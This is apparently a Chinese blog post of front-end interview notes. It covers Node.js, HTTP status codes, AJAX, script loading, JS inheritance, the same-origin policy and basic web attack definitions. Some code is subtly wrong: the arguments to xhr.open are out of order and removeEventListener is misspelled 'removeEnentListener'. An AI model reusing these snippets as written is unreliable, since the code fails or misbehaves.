</code></pre><h3 id="Node-js的优缺点"><a href="#Node-js的优缺点" class="headerlink" title="Node.js的优缺点"></a>Node.js的优缺点</h3><p>优点：<br>　　　1、 高并发。采用事件驱动，异步编程，为网络服务而设计。NodeJS能支持比Java、PHP程序更高的并发量，虽然维护事件队列也需要成本，再由于NodeJS是单线程，事件队列越长，得到响应的时间就越长，并发量上还是会力不从心。<br>　　　2、 适合I/O密集型应用。 node.js非阻塞模式的IO处理给node.js带来在相对较低的资源耗用下的高性能与出众的负载能力,适合处理并发请求。<br>　　　3、 node.js轻量高效，可以认为是数据密集型实时应用系统的完美解决方案。<br>　　　4、 js语言适合前端工程师上手。<br>　　　5、 社区活跃发展速度快<br>缺点：<br>　　　1、 单线程，单进程，只支持单核CPU，不能充分的利用多核CPU服务器。<br>　　　2、 对程序员要求高一旦进程崩溃，那么整个web服务器就崩溃了。 解决方案：（1）Nnigx反向代理，负载均衡，开多个进程，绑定多个端口；（2）开多个进程监听同一个端口，使用cluster模块；<br>　　　3、 不适合做复杂性很高的计算。<br>　　　4、 不适合CPU密集型应用；CPU密集型应用给Node带来的挑战主要是：由于JavaScript单线程的原因，如果有长时间运行的计算（比如大循环），将会导致CPU时间片不能释放，使得后续I/O无法发起；<br>　　　5、 开源组件库质量参差不齐，更新快，向下不兼容<br>　　　6、 Debug不方便，错误没有stack trace<br>NodeJS适合运用在高并发、I/O密集、少量业务逻辑的场景。<br><a href="http://blog.csdn.net/xiaemperor/article/details/38234979" target="_blank" rel="noopener">NodeJS优缺点及适用场景讨论</a></p>
<h3 id="前端界面工程师-理解及前景"><a href="#前端界面工程师-理解及前景" class="headerlink" title="前端界面工程师 理解及前景"></a>前端界面工程师 理解及前景</h3><p> 前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。<br>1、 实现界面交互<br>2、 提升用户体验<br>3、 有了Node.js，前端可以实现服务端的一些事情<br>4、 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好<br>5、 参与项目，快速高质量完成实现效果图，精确到1px；<br>6、 与团队成员，UI设计，产品经理的沟通；<br>7、 做好的页面结构，页面重构和用户体验；<br>8、 处理hack，兼容、写出优美的代码格式；<br>9、 针对服务器的优化、拥抱最新前端技术。 </p>
<h3 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h3><p>1xx: 信息性状态码，表示服务器接收到请求正在处理。<br>2xx: 成功状态码，表示服务器正确处理完请求。<br>3xx: 重定向状态码，表示请求的资源位置发生改变，需要重新请求。301永久重定向，302临时重定向。<br>4xx: 客户端错误状态码，服务器无法处理该请求。 404 not found<br>5xx: 服务器错误状态码，服务器处理请求出错。</p>
<p>100 Continue  继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息<br>200 OK   正常返回信息<br>201 Created  请求成功并且服务器创建了新的资源<br>202 Accepted  服务器已接受请求，但尚未处理<br>301 Moved Permanently  请求的网页已永久移动到新位置<br>302 Found  临时性重定向<br>303 See Other  临时性重定向，且总是使用 GET 请求新的 URI<br>304 Not Modified  自从上次请求后，请求的网页未修改过<br>400 Bad Request  服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求<br>401 Unauthorized  请求未授权<br>403 Forbidden  禁止访问<br>404 Not Found  找不到如何与 URI 相匹配的资源<br>500 Internal Server Error  最常见的服务器端错误<br>503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）</p>
<h3 id="页面加载过程"><a href="#页面加载过程" class="headerlink" title="页面加载过程"></a>页面加载过程</h3><p>1、 当发送一个 URL 请求时，不管这个 URL 是 Web 页面的 URL 还是 Web 页面上每个资源的 URL，浏览器都会开启一个线程来处理这个请求，同时在远程 DNS 服务器上启动一个 DNS 查询。这能使浏览器获得请求对应的 IP 地址。(DNS查询方式：浏览器缓存-&gt;系统缓存-&gt;路由器缓存)<br>2、 浏览器与远程 Web 服务器通过 TCP 三次握手协商来建立一个 TCP/IP 连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。<br>3、 一旦 TCP/IP 连接建立，浏览器会通过该连接向远程服务器发送 HTTP 的 GET 请求。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。<br>4、 此时，Web 服务器提供资源服务，客户端开始下载资源。</p>
<p>请求返回后，便进入了我们关注的前端模块<br>浏览器会解析 HTML 生成 DOM Tree，其次会根据 CSS 生成 CSS Rule Tree，而 javascript 又可以根据 DOM API 操作 DOM</p>
<h3 id="如何管理项目"><a href="#如何管理项目" class="headerlink" title="如何管理项目"></a>如何管理项目</h3><p>1、 先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等<br>2、 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）<br>3、 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）<br>4、 页面进行标注（例如 页面 模块 开始和结束）<br>5、 CSS 跟 HTML 分文件夹并行存放，命名都得统一（例如 style.css）<br>6、 JS 分文件夹存放 命名以该 JS 功能为准的英文翻译<br>7、 图片采用整合的 images.png png8 格式文件使用 尽量整合在一起使用方便将来的管理</p>
<h3 id="javascript对象的几种创建方式"><a href="#javascript对象的几种创建方式" class="headerlink" title="javascript对象的几种创建方式"></a>javascript对象的几种创建方式</h3><p>1、工厂模式<br>2、构造函数模式<br>3、原型模式 </p>
<h3 id="javascript继承的-6-种方法"><a href="#javascript继承的-6-种方法" class="headerlink" title="javascript继承的 6 种方法"></a>javascript继承的 6 种方法</h3><p>1、 原型链继承<br>2、 借用构造函数继承<br>3、 组合继承(原型+借用构造)<br>4、 原型式继承<br>5、 寄生式继承<br>6、 寄生组合式继承<br><a href="http://www.cnblogs.com/humin/p/4556820.html" target="_blank" rel="noopener">JS继承的实现方式</a></p>
<h3 id="ajax-的过程"><a href="#ajax-的过程" class="headerlink" title="ajax 的过程"></a>ajax 的过程</h3><p>1、 创建XMLHttpRequest对象,也就是创建一个异步调用对象<br><code>var xhr = new XMLHttpRequest()</code><br>2、 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息<br><code>xhr.open(url,&quot;get&quot;,false);</code><br>3、 设置响应HTTP请求状态变化的函数<br><code>onreadyState监听</code><br>4、 发送HTTP请求<br>如果是post必须发送<code>xhr.send(null);</code>(null不能为空)<br>5、 获取异步调用返回的数据<br>6、 使用JavaScript和DOM实现局部刷新</p>
<pre><code>var xhr=new XMLHttpRequest();
    xhr.onreadystatechange=function(){
        if(xhr.readyState===4){
            if(xhr.status===200){
                doResponse(xhr.responseText);
            }
        }
    }
    xhr.open(&apos;GET&apos;,&apos;URL&apos;,true);
    xhr.send(null);

    xhr.open(&apos;POST&apos;,&apos;URL&apos;,true);
    setRequestHeader(&apos;Content-Type&apos;,&apos;application/x-www-form-urlencoded&apos;);
    xhr.send(&apos;k=v&amp;k=v&apos;);
</code></pre><h3 id="异步加载和延迟加载"><a href="#异步加载和延迟加载" class="headerlink" title="异步加载和延迟加载"></a>异步加载和延迟加载</h3><p>把script标签放在head之间，意味着必须等到全部js代码都被下载，解析，执行完成之后，才开始呈现页面的内容。浏览器在遇到body标签时才开始呈现内容</p>
<p>1、<code>&lt;script&gt;</code>标签定义了defer属性，这个属性的用途表明脚本在执行的时候不会影响页面结构，相当于告诉浏览器立即下载，但延迟执行。<br>注意defer属性只使用于外部脚本文件，支持html5的实现会忽略给嵌入脚本设置的defer属性。因此把延迟脚本放在页面的底部仍是最佳的选择<br><code>&lt;script  type = &quot;text/javascript&quot; defer=&quot;defer&quot; src=&quot;.js&quot;&gt;</code><br>2、异步脚本<br>async只使用于外部脚本文件，并告诉浏览器立即下载文件，但与defer不同的是，标记为async的脚本并不保证按照指定他们的先后顺序执行。<br><code>&lt;script  type = &quot;text/javascript&quot; async src=&quot;.js&quot;&gt;</code></p>
<h3 id="前端的安全问题"><a href="#前端的安全问题" class="headerlink" title="前端的安全问题"></a>前端的安全问题</h3><p>1、XSS指cross-site-scripting, 跨站脚本攻击，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br> <a href="https://zhuanlan.zhihu.com/p/26177815?utm_source=weibo&amp;utm_medium=social" target="_blank" rel="noopener">浅谈XSS攻击的那些事（附常用绕过姿势）</a><br>2、SQL注入，指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br><a href="http://blog.csdn.net/qq_34858648/article/details/52750038" target="_blank" rel="noopener">SQL注入攻击原理以及基本方法</a><br>3、OS命令注入攻击，指的是通过web应用，执行非法的操作系统命令达到非法攻击的目的。<br>4、HTTP首部注入攻击，指攻击者通过在相应首部字段内插入换行，然后添加任意响应首部过主体的攻击。 邮件首部注入攻击，指攻击者通过向邮件首部to或subject内任意添加非法内容引起的攻击。<br><a href="http://blog.csdn.net/ffm83/article/details/44222319" target="_blank" rel="noopener">攻击服务端(4)-HTTP参数注入攻击</a><br>5、会话劫持，指攻击者通过某种手段拿到了用户的会话id，并非法使用此会话id伪装成用户达到攻击的目的。 6、还有DoS DDoS，一种让运行中的服务成停止状态的攻击。<br>7、CSRF，跨站点请求伪造攻击，指的是攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。<br>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等<br><a href="http://blog.csdn.net/stpeace/article/details/53512283" target="_blank" rel="noopener"> CSRF攻击与防御</a></p>
<h3 id="ie-各版本和-chrome-可以并行下载多少个资源"><a href="#ie-各版本和-chrome-可以并行下载多少个资源" class="headerlink" title="ie 各版本和 chrome 可以并行下载多少个资源"></a>ie 各版本和 chrome 可以并行下载多少个资源</h3><p>1、 IE6 2 个并发<br>2、 iE7 升级之后的 6 个并发，之后版本也是 6 个<br>3、 Firefox，chrome 也是6个</p>
<h3 id="js继承怎么实现，如何避免原型链上面的对象共享"><a href="#js继承怎么实现，如何避免原型链上面的对象共享" class="headerlink" title="js继承怎么实现，如何避免原型链上面的对象共享"></a>js继承怎么实现，如何避免原型链上面的对象共享</h3><p>1、 原型链继承<br>2、 借用构造函数继承<br>3、 组合继承(原型+借用构造)<br>4、 原型式继承<br>5、 寄生式继承<br>6、 寄生组合式继承<br>利用空对象作为中介。<br><a href="http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance.html" target="_blank" rel="noopener">Javascript面向对象编程（二）：构造函数的继承 —阮一峰</a></p>
<h3 id="代码压缩工具及使用方法"><a href="#代码压缩工具及使用方法" class="headerlink" title="代码压缩工具及使用方法"></a>代码压缩工具及使用方法</h3><p>1、Google Closure Compile<br>2、Yahoo Yui Compresso<br>3、UglifyJS<br>GCC压缩混淆的最彻底，但是破坏原有代码，并且不可压缩CSS文件，运行在java环境下，危险，要严格注意书写规范。<br>Yui可以压缩CSS文件，安全，但是压缩完的文件函数名称没有混淆，压缩混淆的作用小，运行在java环境下。<br>UglifyJs不可以压缩混淆CSS文件，运行在NodeJs环境下，但是压缩完的文件函数名称没有混淆，压缩混淆的作用小，安全<br><a href="http://blog.csdn.net/nh18304030935/article/details/70846649" target="_blank" rel="noopener">JS代码压缩混淆工具使用说明</a></p>
<h3 id="Flash、Ajax各自的优缺点，在使用中如何取舍"><a href="#Flash、Ajax各自的优缺点，在使用中如何取舍" class="headerlink" title="Flash、Ajax各自的优缺点，在使用中如何取舍"></a>Flash、Ajax各自的优缺点，在使用中如何取舍</h3><p>Flash：<br>1、 Flash适合处理多媒体、矢量图形、访问机器<br>2、 对CSS、处理文本上不足，不容易被搜索<br>Ajax：<br>1、 Ajax对CSS、文本支持很好，支持搜索<br>2、 多媒体、矢量图形、机器访问不足<br>共同点：<br>1、 与服务器的无刷新传递消息<br>2、 可以检测用户离线和在线状态<br>3、 操作DOM</p>
<h3 id="JavaScript-的同源策略"><a href="#JavaScript-的同源策略" class="headerlink" title="JavaScript 的同源策略"></a>JavaScript 的同源策略</h3><p>概念：<br>同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。<br>这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性，无法访问其它域的资源。<br>同源策略是浏览器为了保护用户的个人信息以及企业数据的安全而设置的一种策略，不同源的客户端脚本是不能在对方未允许的情况下访问或索取对方的数据信息。</p>
<p>为什么要有同源限制：<br>我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。<br>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
<h3 id="什么是-“use-strict”-使用它的好处和坏处"><a href="#什么是-“use-strict”-使用它的好处和坏处" class="headerlink" title="什么是 “use strict” ? 使用它的好处和坏处"></a>什么是 “use strict” ? 使用它的好处和坏处</h3><p>ECMAscript 5添加了第二种运行模式：”严格模式”（strict mode）。顾名思义，这种模式使得Javascript在更严格的条件下运行。<br>设立”严格模式”的目的，主要有以下几个：<br>1、 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;<br>2、 消除代码运行的一些不安全之处，保证代码运行的安全；<br>3、 提高编译器效率，增加运行速度；<br>4、 为未来新版本的Javascript做好铺垫。<br>注：经过测试 IE6,7,8,9 均不支持严格模式。<br>缺点：<br>现在网站的 JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节。</p>
<h3 id="GET和POST的区别"><a href="#GET和POST的区别" class="headerlink" title="GET和POST的区别"></a>GET和POST的区别</h3><p>GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符<br>POST：一般用于修改服务器上的资源，对所发送的信息没有限制</p>
<p>GET方式需要使用 Request.QueryString 来取得变量的值<br>POST方式通过 Request.Form 来获取变量的值<br>也就是说 Get 是通过地址栏来传值，而 Post 是通过提交表单来传值。</p>
<p>在以下情况中，请使用 POST 请求：<br>1、 无法使用缓存文件（更新服务器上的文件或数据库）<br>2、 向服务器发送大量数据（POST 没有数据量限制）<br>3、 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</p>
<p>HTTP方法 是根据意图区分的，HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。<br>表面区别：<br>(1)传参方式<br>1、 GET可以通过URL直接传参<br>2、 两者都可以通过body传参<br>(2)长度<br>1、 header和body都没有对长度的限制<br>2、 URL的长度受到部分早期浏览器的限制<br>3、 URL的长度还可能受到服务器的限制，由于URL的实际超长或者设定其Content-Length较大值会引起服务器最大并发数下降或者资源空耗<br>4、 2和3间接限定了URL方式发起GET方法的长度<br>(3)安全性<br>1、 GET不会修改服务端数据，POST可以修改数据<br>2、 URL方式发起GET请求，参数会明文暴露<br>3、 使用GET提交数据还可能会造成Cross-site request forgery攻击<br>4、 本质上安全性无区别 </p>
<h3 id="css阻塞，js阻塞"><a href="#css阻塞，js阻塞" class="headerlink" title="css阻塞，js阻塞"></a>css阻塞，js阻塞</h3><p><strong>js 的阻塞特性：</strong>所有浏览器在下载 JS 的时候，会阻止一切其他活动，比如其他资源的下载，内容的呈现等等。直到 JS 下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。为了提高用户体验，新一代浏览器都支持并行下载 JS，但是 JS 下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。<br>浏览器为了防止出现 JS 修改 DOM 树，需要重新构建 DOM 树的情况，所以就会阻塞其他的下载和呈现。<br>嵌入 JS 会阻塞所有内容的呈现，而外部 JS 只会阻塞其后内容的显示，2 种方式都会阻塞其后资源的下载。也就是说外部样式不会阻塞外部脚本的加载，但会阻塞外部脚本的执行。 </p>
<p>CSS 怎么会阻塞加载了？CSS 本来是可以并行下载的，在什么情况下会出现阻塞加载了(在测试观察中，IE6 下 CSS 都是阻塞加载）<br>当 CSS 后面跟着嵌入的 JS 的时候，该 CSS 就会出现阻塞后面资源下载的情况。而当把嵌入 JS 放到 CSS 前面，就不会出现阻塞的情况了。<br>根本原因：因为浏览器会维持 html 中 css 和 js 的顺序，样式表必须在嵌入的 JS 执行前先加载、解析完。而嵌入的 JS 会阻塞后面的资源加载，所以就会出现上面 CSS 阻塞下载的情况。 </p>
<p> 嵌入JS应该放在什么位置？<br>1、 放在底部，虽然放在底部照样会阻塞所有呈现，但不会阻塞资源下载。<br>2、 如果嵌入JS放在head中，请把嵌入JS放在CSS头部。<br>3、 使用 defer（只支持IE）<br>4、 不要在嵌入的JS中调用运行时间较长的函数，如果一定要用，可以用 setTimeout 来调用</p>
<p>Javascript无阻塞加载具体方式：<br>1、 将脚本放在底部。<code>&lt;link&gt;</code>还是放在head中，用以保证在js加载前，能加载出正常显示的页面。<code>&lt;script&gt;</code>标签放在<code>&lt;/body&gt;</code>前。<br>2、 阻塞脚本：由于每个<code>&lt;script&gt;</code>标签下载时阻塞页面解析过程，所以限制页面的<code>&lt;script&gt;</code>总数也可以改善性能。适用于内联脚本和外部脚本。<br>3、 非阻塞脚本：等页面完成加载后，再加载js代码。也就是，在 window.onload 事件发出后开始下载代码。<br>4、 defer属性：支持IE4和fierfox3.5更高版本浏览器<br>5、 动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容。代码如下：</p>
<pre><code>&lt;script&gt;
    var script=document.createElement(&quot;script&quot;);
    script.type=&quot;text/javascript&quot;;
    script.src=&quot;file.js&quot;;
    document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
</code></pre><p>此技术的重点在于：无论在何处启动下载，文件下载和运行都不会阻塞其他页面处理过程，即使在head里（除了用于下载文件的 http 链接）<br><strong>关于CSS加载造成阻塞问题</strong><br>css并不会阻塞DOM树的解析，但会阻塞DOM树渲染。css加载会阻塞后面js语句的执行。<br>为了避免让用户看到长时间的白屏时间，我们应该尽可能的提高css加载速度，比如可以使用以下几种方法:<br>1.使用CDN(因为CDN会根据你的网络状况，替你挑选最近的一个具有缓存内容的节点为你提供资源，因此可以减少加载时间)<br>2.对css进行压缩(可以用很多打包工具，比如webpack,gulp等，也可以通过开启gzip压缩)<br>3.合理的使用缓存(设置cache-control,expires,以及E-tag都是不错的，不过要注意一个问题，就是文件更新后，你要避免缓存而带来的影响。其中一个解决防范是在文件名字后面加一个版本号)<br>4.减少http请求数，将多个css文件合并，或者是干脆直接写成内联样式(内联样式的一个缺点就是不能缓存)<br><a href="https://www.cnblogs.com/chenjg/p/7126822.html" target="_blank" rel="noopener">css加载会造成阻塞吗</a></p>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>1、 它的功能是把对应的字符串解析成JS代码并运行<br>2、 应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）</p>
<h3 id="一个通用的事件侦听器函数"><a href="#一个通用的事件侦听器函数" class="headerlink" title="一个通用的事件侦听器函数"></a>一个通用的事件侦听器函数</h3><pre><code>// event(事件)工具集，来源：github.com/markyun
markyun.Event = {
    // 页面加载完成后
    readyEvent : function(fn) {
        if (fn==null) {
            fn=document;
        }
        var oldonload = window.onload;
        if (typeof window.onload != &apos;function&apos;) {
            window.onload = fn;
        } else {
            window.onload = function() {
                oldonload();
                fn();
            };
        }
    },
    // 视能力分别使用dom0||dom2||IE方式 来绑定事件
    // 参数： 操作的元素,事件名称 ,事件处理程序
    addEvent : function(element, type, handler) {
        if (element.addEventListener) {
            //事件类型、需要执行的函数、是否捕捉
            element.addEventListener(type, handler, false);
        } else if (element.attachEvent) {
            element.attachEvent(&apos;on&apos; + type, function() {
                handler.call(element);
            });
        } else {
            element[&apos;on&apos; + type] = handler;
        }
    },
    // 移除事件
    removeEvent : function(element, type, handler) {
        if (element.removeEnentListener) {
            element.removeEnentListener(type, handler, false);
        } else if (element.detachEvent) {
            element.detachEvent(&apos;on&apos; + type, handler);
        } else {
            element[&apos;on&apos; + type] = null;
        }
    }, 
    // 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)
    stopPropagation : function(ev) {
        if (ev.stopPropagation) {
            ev.stopPropagation();
        } else {
            ev.cancelBubble = true;
        }
    },
    // 取消事件的默认行为
    preventDefault : function(event) {
        if (event.preventDefault) {
            event.preventDefault();
        } else {
            event.returnValue = false;
        }
    },
    // 获取事件目标
    getTarget : function(event) {
        return event.target || event.srcElement;
    },
    // 获取event对象的引用，取到事件的所有信息，确保随时能使用event；
    getEvent : function(e) {
        var ev = e || window.event;
        if (!ev) {
            var c = this.getEvent.caller;
            while (c) {
                ev = c.arguments[0];
                if (ev &amp;&amp; Event == ev.constructor) {
                    break;
                }
                c = c.caller;
            }
        }
        return ev;
    }
};
</code></pre><h3 id="Node-js-的适用场景"><a href="#Node-js-的适用场景" class="headerlink" title="Node.js 的适用场景"></a>Node.js 的适用场景</h3><p>1、 高并发<br>2、 聊天<br>3、 实时消息推送   </p>
<p>1 Web开发：Express + EJS + Mongoose/MySQL<br>express 是轻量灵活的Nodejs Web应用框架，它可以快速地搭建网站。Express框架建立在Nodejs内置的Http模块上，并对Http模块再包装，从而实际Web请求处理的功能。<br>ejs是一个嵌入的Javascript模板引擎，通过编译生成HTML的代码。<br>mongoose 是MongoDB的对象模型工具，通过Mongoose框架，可以进行访问MongoDB的操作。<br>mysql 是连接MySQL数据库的通信API，可以进行访问MySQL的操作。<br>通常用Nodejs做Web开发，需要3个框架配合使用，就像Java中的SSH。<br>2 REST开发：Restify<br>restify 是一个基于Nodejs的REST应用框架，支持服务器端和客户端。restify比起express更专注于REST服务，去掉了express中的 template, render等功能，同时强化了REST协议使用，版本化支持，HTTP的异常处理。<br>3 Web聊天室(IM)：Express + Socket.io<br>socket.io一个是基于Nodejs架构体系的，支持websocket的协议用于时时通信的一个软件包。socket.io 给跨浏览器构建实时应用提供了完整的封装，socket.io完全由javascript实现。<br>4 Web爬虫：Cheerio/Request<br>cheerio 是一个为服务器特别定制的，快速、灵活、封装jQuery核心功能工具包。Cheerio包括了 jQuery核心的子集，从jQuery库中去除了所有DOM不一致性和浏览器不兼容的部分，揭示了它真正优雅的API。Cheerio工作在一个非常简 单，一致的DOM模型之上，解析、操作、渲染都变得难以置信的高效。基础的端到端的基准测试显示Cheerio大约比JSDOM快八倍(8x)。 Cheerio封装了@FB55兼容的htmlparser，几乎能够解析任何的 HTML 和 XML document。<br>5 Web博客：Hexo<br>Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架。通过Hexo我们可以快速创建自己的博客，仅需要几条命令就可以完成。<br>发布时，Hexo可以部署在自己的Node服务器上面，也可以部署github上面。对于个人用户来说，部署在github上好处颇多，不仅可以省 去服务器的成本，还可以减少各种系统运维的麻烦事(系统管理、备份、网络)。所以，基于github的个人站点，正在开始流行起来….<br>6 Web论坛: nodeclub<br>Node Club 是用 Node.js 和 MongoDB 开发的新型社区软件，界面优雅，功能丰富，小巧迅速， 已在Node.js 中文技术社区 CNode 得到应用，但你完全可以用它搭建自己的社区。<br>7 Web幻灯片：Cleaver<br>Cleaver 可以生成基于Markdown的演示文稿。如果你已经有了一个Markdown的文档，30秒就可以制作成幻灯片。Cleaver是为Hacker准备的工具。<br>8 前端包管理平台: bower.js<br>Bower 是 twitter 推出的一款包管理工具，基于nodejs的模块化思想，把功能分散到各个模块中，让模块和模块之间存在联系，通过 Bower 来管理模块间的这种联系。<br>9 OAuth认证：Passport<br>Passport项 目是一个基于Nodejs的认证中间件。Passport目的只是为了“登陆认证”，因此，代码干净，易维护，可以方便地集成到其他的应用中。Web应用 一般有2种登陆认证的形式：用户名和密码认证登陆,OAuth认证登陆。Passport可以根据应用程序的特点，配置不同的认证机制。本文将介绍，用户 名和密码的认证登陆。<br>10 定时任务工具: later<br>Later 是一个基于Nodejs的工具库，用最简单的方式执行定时任务。Later可以运行在Node和浏览器中。<br>11 浏览器环境工具: browserify<br>Browserify 的出现可以让Nodejs模块跑在浏览器中，用require()的语法格式来组织前端的代码，加载npm的模块。在浏览器中，调用browserify编译后的代码，</p>
<h3 id="JavaScript-原型，原型链-有什么特点？"><a href="#JavaScript-原型，原型链-有什么特点？" class="headerlink" title="JavaScript 原型，原型链 ? 有什么特点？"></a>JavaScript 原型，原型链 ? 有什么特点？</h3><p><strong>1.什么是原型，原型有什么特点：</strong><br>JavaScript 的每个对象都继承另一个对象，后者称为“原型”（prototype）对象。只有null除外，它没有自己的原型对象。<br>使用原型的好处是：原型对象上的所有属性和方法，都能被对应的构造函数创建的实例对象共享（这就是 JavaScript 继承机制的基本设计），也就是说，不必在构造函数中定义对象实例的信息，而是可以将这些信息直接添加到原型对象中。<br>每一个构造函数都有一个prototype（原型）属性，这个属性就是使用构造函数创建出来的实例对象的原型对象。<br><strong>2.什么是原型链，原型链有什么特点</strong><br>对象的属性和方法，有可能是定义在自身，也有可能是定义在它的原型对象上。由于原型本身也是对象，又有自己的原型，所以形成了一条原型链（prototype chain）。<br>如果一层层地上溯，所有对象的原型最终都可以上溯到Object.prototype，即Object构造函数的prototype属性指向的那个对象。而Object.prototype对象的原型就是没有任何属性和方法的null对象，而null对象没有自己的原型。<br>“原型链”的作用是，读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的Object.prototype还是找不到，则返回undefined。<br>如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。<br>需要注意的是，一级级向上，在原型链寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。</p>
<h3 id="怎么重构页面"><a href="#怎么重构页面" class="headerlink" title="怎么重构页面"></a>怎么重构页面</h3><p>页面重构是一种思想，是页面的二次构造（在实现层次）：包括设计稿的重构、过时页面的重构、功能不全页面的重构、代码重构。<br>设计稿的重构：设计师的设计稿可能不是特别符合页面效果，当拿到设计稿时需要通过二次重构和修改达到预期效果。<br>功能不全页面的重构：页面功能不符合用户体验、用户交互。<br>过时页面的重构：使用的是过时的代码和标签，跟不上时代的发展。<br>代码重构：代码质量、SEO优化、页面性能、更好的语义化、浏览器兼容、CSS优化。</p>
<h3 id="WEB应用从服务器主动推送Data到客户端的方式"><a href="#WEB应用从服务器主动推送Data到客户端的方式" class="headerlink" title="WEB应用从服务器主动推送Data到客户端的方式"></a>WEB应用从服务器主动推送Data到客户端的方式</h3><p>1、<strong>AJAX轮询</strong><br>利用XHR，通过setInterval定时发送请求，但会造成数据同步不及时及无效的请求，增加后端处理压力<br>2、<strong>基于 AJAX 的长轮询</strong>（long-polling）方式<br>在Ajax轮询基础上做的一些改进，在没有更新的时候不再返回空响应，而且把连接保持到有更新的时候，客户端向服务器发送Ajax请求，服务器接到请求后hold住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求，通常把这种实现也叫做<strong>comet</strong>。<br>3、<strong>Server-sent-events(SSE)</strong><br>让服务端可以向客户端流式发送文本消息，在实现上，客户端浏览器中增加EventSource对象，使其能通过事件的方式接收到服务器推送的消息，在服务端，使用长连接的事件流协议，即请求响应时增加新数据流数据格式。<br>适应于后端数据更新频繁且对实时性要求较高而又不需要客户端向服务端通信的场景下。<br>缺点： 只能单向通信，服务器端向客户端推送事件；事件流协议只能传输UTF-8数据，不支持二进制流。<br>4、<strong>HTTP Streaming</strong><br>通过iframe和<code>&lt;script&gt;</code>标签完成数据的传输<br>5、<strong>TCP 长连接</strong><br>6、<strong>HTML5 WebSocket</strong><br>可以实现服务器主动发送数据至网页端，它和HTTP一样，是一个基于HTTP的应用层协议，跑的是TCP，所以本质上还是个长连接，双向通信，意味着服务器端和客户端可以同时发送并响应请求，而不再像HTTP的请求和响应<br><a href="https://www.zhihu.com/question/24938934" target="_blank" rel="noopener">服务端是如何主动推送信息到客户端的？</a><br><a href="http://www.daimajiayuan.com/sitejs-65893-1.html" target="_blank" rel="noopener">几种web服务器端推送技术的简单介绍</a><br><a href="https://www.cnblogs.com/Herzog3/p/5939144.html" target="_blank" rel="noopener">HTML5服务器推送消息的各种解决办法</a></p>
<h3 id="事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？"><a href="#事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？" class="headerlink" title="事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？"></a>事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</h3><p>1、 我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为<br>2、 事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件<br>3、 ev.stopPropagation();<br>注意旧ie的方法：ev.cancelBubble = true;</p>
